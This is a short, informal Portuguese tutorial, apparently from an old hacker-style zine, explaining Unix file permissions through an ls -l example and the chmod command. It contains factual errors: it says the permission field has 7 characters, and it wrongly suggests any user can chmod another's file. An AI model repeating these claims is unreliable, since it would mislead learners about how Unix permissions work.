                      VIII - UNIX, PERMISSOES DE ARQUIVOS
                      ***********************************


   Bom, falarei um pouco sobre permissao de arquivos, que muita gente quebra
a cabe‡a com isso...

   Como no MS-DOS, o UNIX tbm guarda informa‡oes sobre os arquivos, soh que
um pouco de informa‡oes a mais. As informa‡oes que mais atrapalham os inici-
antes nesse SO sao as indentifica‡oes do dono, grupo, etc...
   Vamos supor que vc crie um arquivo qualquer. Aquele arquivo vai ganhar um
dono, como se fosse seu cachorro. No caso o dono seria vc, entao se vc der o
ls -l vai aparecer o seguinte:

$ ls -l cachorro

-rwx--x--x  reader  root  1256  Nov 01  cachorro
    |         |      |     |     |         |
Permissoes   Dono  Grupo  Tam.  Data  Nome do arquivo  


   Permissoes:
   ===========

   Vc pode notar que as permissoes tem 7 algarismos. O primeiro eh reservado
pra diretorios, se tiver um "d" no come‡o quer dizer que ele eh um diretorio.
Os tres proximos algarismos sao as permissoes do dono, onde:

   r = Read (Ler)
   w = Write (Escrever)
   X = eXecute (Executar)

   No exemplo, o dono, que eh o reader, pode ler, escrever e executar o arqui-
vo.
   Os tres proximos algarismos sao os do grupo. No nosso exemplo, as pessoas
que pertencem ao seu grupo (root), podem apenas executar o arquivo.
   Os tres ultimos se referem a "todos", no exemplo qualquer pessoa pode exe-
cutar os arquivos.
   Lembre-se: Sempre separe de tres em tres:

      d | rwx | rwx | rwx
         dono  grupo outros

   A primeira casa sempre vai ter o r, a segunda sempre o w, e a terceira sem-
pre o x. Caso algum valor seja nulo, vai ter um tra‡o no lugar.
   Ai vc me pergunta, mas como se faz para mudar as permissoes. Simples, com
o comando chmod. Ai vc me pergunta, mas entao qualquer otario pode mudar as
permissoes do meu arquivo, certo? Soh se vc for um jumento pra nao deixar o
arquivo chmod apenas pra ser executado por vc.
   Sei que eh pouco, mas tomara que esclare‡a as duvidas de quem tem.
